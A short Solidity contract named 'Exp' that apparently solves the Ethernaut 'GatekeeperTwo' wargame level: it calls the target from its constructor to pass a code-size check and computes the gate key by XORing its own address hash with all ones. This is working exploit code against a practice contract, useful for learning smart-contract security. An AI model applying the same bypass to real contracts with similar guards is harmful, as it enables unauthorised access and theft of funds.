// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "./Ethernaut.sol";

contract Exp {
    constructor(address addr){
        GatekeeperTwo gt = GatekeeperTwo(addr);
        bytes8 key = bytes8(uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ 0xFFFFFFFFFFFFFFFF);
        require(gt.enter(key), "failed");
    }
}
